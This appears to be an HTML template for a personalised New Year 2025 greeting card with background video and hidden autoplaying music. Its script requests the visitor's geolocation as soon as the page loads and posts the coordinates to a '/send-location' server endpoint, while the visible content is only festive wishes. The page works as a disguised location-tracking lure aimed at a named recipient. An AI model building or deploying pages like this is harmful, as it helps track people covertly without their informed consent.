<!DOCTYPE html>
<html>
    <head>
        <title>Greeting</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: rgb(22, 181, 187);
                color: aqua;
                text-align: center;
                background-image: url('');
                background-size: 150%;
                background-position: center;
                background-repeat: no-repeat;
            }
            h1 {
                justify-content: center;
                display: flex;
                font-family: gabriola;
                color: aqua;
                font-size: 30px;
            }
            p {
                font-size: 25px;
            }
            .container {
                font-family: Gabriola;
                text-align: center;
                padding: 20px;
                border-radius: 15px;                    
            }
            #backgroundVideo {
                position: absolute;
                top: 50%;
                left: 50%;
                min-width: 100%;
                min-height: 100%;
                width: auto;
                height: auto;
                z-index: -1; /* Place the video behind other content */
                transform: translate(-50%, -50%); /* Center the video */
            }
            a {
                color: aqua;
                font-size: 20px;
            }
        </style>
        <script>
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendLocation, showError);
                } else {
                    alert("Geolocation is not supported by this browser.");
                }
            }

            function sendLocation(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Send the location to the server
                fetch('/send-location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ latitude: latitude, longitude: longitude })
                })
                .then(response => {
                    if (response.ok) {
                        alert("Location sent successfully!");
                    } else {
                        alert("Error sending location.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                });
            }

            function showError(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        alert("User  denied the request for Geolocation.");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        alert("Location information is unavailable.");
                        break;
                    case error.TIMEOUT:
                        alert("The request to get user location timed out.");
                        break;
                    case error.UNKNOWN_ERROR:
                        alert("An unknown error occurred.");
                        break;
                }
            }

            // Automatically request location when the page loads
            window.onload = function() {
                getLocation();
            };
        </script>
    </head>
    <body>
        <div class="container">
            <h1>ðŸŽ‰ Happy New Year! ðŸŽ‰</h1>
    <p>Dear <span class="highlight">{{ name }}</span>,</p>
    <p>As we step into <span class="highlight">2025</span>, I wish you a year filled with:</p>
    <ul style="list-style-type: none; padding: 0;">
        <li>âœ¨ Joy and Happiness âœ¨</li>
        <li>ðŸŒŸ Success and Prosperity ðŸŒŸ</li>
        <li>ðŸ’– Love and Good Health ðŸ’–</li>
    </ul>
    <p>May all your dreams come true, and may this year bring you endless opportunities and unforgettable moments.</p>
    <p>Cheers to a fantastic new beginning! ðŸ¥‚</p>
    <p>Warm wishes,</p>
    <p><span class="highlight">SVJeff</span></p>
            <video autoplay muted loop id="backgroundVideo">
                <source src="/static/images/bgvid.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            <h2>{{ song_title }}</h2>
            <audio style="display: none;" controls autoplay>
                <source src="{{ song_path }}" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>

            <br>

            <a href="/">Home</a>

            
            <!-- Hidden button for location (not needed anymore) -->
            <button style="display: none;" onclick="getLocation()">Get Location</button>
        </div>
    </body>
</html>